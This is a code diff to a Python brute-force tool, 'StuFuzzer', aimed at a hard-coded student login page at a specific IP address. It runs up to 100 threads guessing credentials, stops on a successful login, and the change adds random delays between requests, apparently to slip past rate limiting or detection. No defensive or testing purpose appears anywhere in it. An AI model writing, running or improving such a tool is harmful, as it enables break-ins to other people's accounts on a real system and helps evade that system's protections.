@@ -4,7 +4,8 @@ from threading import Thread, Lock, Event
 import requests
 from argparse import ArgumentParser
 import base64
-
+import random as rd
+import time
 
 class StuFuzzer(object):
     url = 'http://222.194.15.1:7777/pls/wwwbks/bks_login2.login'
@@ -13,7 +14,8 @@ class StuFuzzer(object):
     template_cookie = None
     initialized = Event()
 
-    def __init__(self, template_id, template_pwd):
+    def __init__(self, template_id, template_pwd, max_sleep=10):
+        self.max_sleep = max_sleep
         if not self.initialized.is_set():
             StuFuzzer.template_data = {'stuid': template_id, 'pwd': template_pwd}
             while True:
@@ -57,7 +59,9 @@ class StuFuzzer(object):
         if not session:
             session = requests.Session()
         for req in composer:
+            time.sleep(rd.randint(0, self.max_sleep))
             resp = session.send(req)
+            print('Sent')
             if self.checker(resp):
                 composer.stop = True
                 if callback is not None:
@@ -93,7 +97,7 @@ def main(args):
         except Exception:
             pass
 
-        breaker = StuFuzzer(args.login_id, args.login_pwd)
+        breaker = StuFuzzer(args.login_id, args.login_pwd, args.sleep)
         breaker.fuzz(
             args.target,
             args.threads,
@@ -119,6 +123,8 @@ def parse_arguments():
                         help='Start position offset, default 0', default=0)
     parser.add_argument('-t', '--threads', metavar='N', type=int,
                         help='Threads number, default 100', default=100)
+    parser.add_argument('-s', '--sleep', metavar='N', type=int,
+                        help='Max sleep time, default 10', default=10)
 
     return parser.parse_args()
 
